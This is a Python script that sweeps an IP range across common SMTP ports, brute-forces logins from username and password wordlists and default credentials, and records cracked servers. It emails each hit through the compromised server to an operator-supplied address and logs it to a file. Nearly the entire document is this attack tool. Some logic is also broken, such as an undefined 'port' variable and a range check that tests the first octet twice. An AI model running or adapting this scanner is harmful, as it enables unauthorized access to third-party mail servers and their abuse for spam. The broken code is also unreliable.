### IP address classes
### Class	 |   Address range
###------------------------------------------
### Class A	 | 1.0.0.1   to 126.255.255.254
### Class B	 | 128.1.0.1 to 191.255.255.254
### Class C	 | 192.0.1.1 to 223.255.254.254
### Class D	 | 224.0.0.0 to 239.255.255.255


#!/usr/bin/python
from __future__ import print_function
import socket,sys
import smtplib
from smtplib import *
import time
import threading
import os, threading
import fileinput
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import string
import time
from random import randint, choice

standard_ports = [25, 465, 587, 2525, 25025]
default_user_pass = {
    'admin':'admin',
    'test':'testpass',
    'root':'root',
    'support':'support',
}

class IP(object):
    def __init__(self, ip_address):
        if len(ip_address.split('.')) != 4:
            raise ValueError('Invalid IP Address : '+ip_address)
        try:
            P1, P2, P3, P4 = map(int, ip_address.split('.'))
        except ValueError:
            raise ValueError('Invalid IP Adress : '+ip_address + '. It should only contain Integer')
        
        if not IP.check_within_range(P1, P2, P3, P4):
            raise ValueError('IP Address is not within valid range. "1.0.0.1" to "239.255.255.255"')
        
        self.P1, self.P2, self.P3, self.P4 = P1, P2, P3, P4
                
    def __str__(self):
        return '.'.join(map(str, [self.P1,self.P2,self.P3,self.P4]))
        
    def __eq__(self, ip2):
        if self.P1 == ip2.P1 and self.P2 == ip2.P2 and self.P3 == ip2.P3 and self.P4 == ip2.P4:
            return True
        else:
            return False

    def __lt__(self, ip2):
        return not self.__gt__(ip2)
    
    def __gt__(self, ip2):
        if self.P1 > ip2.P1:
            return True
        elif self.P1 < ip2.P1:
            return False
        else:
            if self.P2 > ip2.P2:
                return True
            elif self.P2 < ip2.P2:
                return False
            else:
                if self.P3 > ip2.P3:
                    return True
                elif self.P3 < ip2.P3:
                    return False
                else:
                    if self.P4 > ip2.P4:
                        return True
                    elif self.P4 < ip2.P4:
                        return False
                    else:
                        return True                

    @staticmethod    
    def check_within_range(P1,P2,P3,P4):
        return True if (P1 >= 1 and P1 <= 239) and \
                        (P2 >= 0 and P2 <= 255) and \
                        (P3 >= 0 and P3 <= 255) and \
                        (P1 >= 1 and P1 <= 255) \
                    else False
            
        
def generate_range(ip1, ip2):
    ips = []
    for i in range(ip1.P1,ip2.P1+1):
        if ip1.P1 == ip2.P1:
            start1, end1 = ip1.P2, ip2.P2+1 
        elif i == ip2.P1:
            start1, end1 = 0, ip2.P2+1
        else:
            start1, end1 = 0, 255
        for j in range(start1, end1):
            if ip1.P2 == ip2.P2:
                start2, end2 = ip1.P3, ip2.P3+1
            elif j == ip2.P2:
                start2, end2 = 0, ip2.P3+1
            else:
                start2, end2 = 0, 255
            for k in range(start2, end2):
                if ip1.P3 == ip2.P3:
                    start3, end3 = ip1.P4, ip2.P4+1
                elif k == ip2.P3:
                    start3, end3 = 0, ip2.P4+1
                else:
                    start3, end3 = 0, 255
                for l in range(start3, end3):
                    ip_address = '.'.join(map(str,[i,j,k,l]))
                    gen_ip = IP(ip_address)
                    yield gen_ip
                    #ips.append(gen_ip)
                    #if ip2 == gen_ip:
                    #    return ips


def	Scan(IP,Port, username=None, passwd=None, rcpt = ''):
    msg = MIMEMultipart('related')
    min_char = 20
    max_char = 25
    
    try:
        HOSTNAME = socket.gethostbyaddr(IP)
        HOSTNAME = HOSTNAME[0] if HOSTNAME else 'UNKNOWN_HOST'
    except:
        HOSTNAME = 'UNKNOWN_HOST'
        
    msg['From'] = username+'@'+HOSTNAME
    msg['To'] = rcpt
    msg['Subject'] = "FOUND [ "+IP+":"+Port+" ]"  
    inputmail = "[ "+IP+":"+Port+" ("+HOSTNAME+") ]"
    msg.attach(MIMEText(inputmail, 'plain'))
    
    print("[+]SCANNING FOR SMTP UNDER: "+IP+" ("+HOSTNAME+"): WITH PORT: "+Port+", Username : "+str(username)+", Password : "+str(passwd))
    str1 = ("[+]SCANNING FOR SMTP UNDER: "+IP+" ("+HOSTNAME+"): WITH PORT: "+Port+", Username : "+str(username)+", Password : "+str(passwd))
    try:
        smtpserver = smtplib.SMTP(IP,int(Port)) if port != '465' else smtplib.SMTP_SSL(IP,int(Port))
        smtpserver = smtplib.SMTP(IP,int(Port)) if port in ['465', '587'] else smtplib.SMTP_SSL(IP,int(Port))
        smtpserver.ehlo_or_helo_if_needed()
        if username and passwd:
            smtpserver.login(username, passwd)
        smtpserver.sendmail(msg['From'], msg['To'], msg.as_string())
        str2 = ("[+]SMTP FOUND ON: "+IP+" ("+HOSTNAME+"):"+Port + ", Username : "+str(username) + ", Password : "+str(passwd))
    except:
        str2 = ("[+]SMTP NOT FOUND ON: "+IP+" ("+HOSTNAME+")")
    finally:
        smtpserver.quit()
    
    return str1, str2, username, passwd

def read_file(file_name):
    with open(file_name) as f:
        for line in f:
            yield line

def send():
    pool = ThreadPoolExecutor(int(sys.argv[2])) ## Replace thread with ProcessPoolExecutor for later try
    results = []
    IPRANGE = sys.argv[1]
    rcpt = sys.argv[3]
    try:
        START_IP, END_IP = IPRANGE.split(':')
        ip1, ip2 = IP(START_IP), IP(END_IP)
    except ValueError:
        print('Invalid IP Range : '+IPRANGE)
        return 
    
    if ip2 == ip1 or ip2 > ip1:
        ips = generate_range(ip1, ip2)
        #print('Submitting Jobs')
        for ip in ips:
            #print(ip)
            for port in standard_ports:
                results.append(pool.submit(Scan,str(ip), str(port), None, None ,rcpt))
                #for username, passwd in default_user_pass.items():
                for username in open('names.txt'):
                    for passwd in open('pass1.txt'):
                        if len(results) % 10 == 0:
                            time.sleep(5)
                        results.append(pool.submit(Scan,str(ip), str(port), username.strip(), passwd.strip(), rcpt))
    else:
        raise ValueError('IP : '+str(ip2)+' is less than IP : '+str(ip1))
    
    for r in as_completed(results, timeout=None):
        resp1, resp2, username, passwd = r.result()
        if 'SMTP FOUND ON' in resp2:
            print(resp2+ ', ' + str(username) + ', ' + str(passwd))
            with open('found.txt','a') as f:
                f.write(resp2+'\n')
	
send()
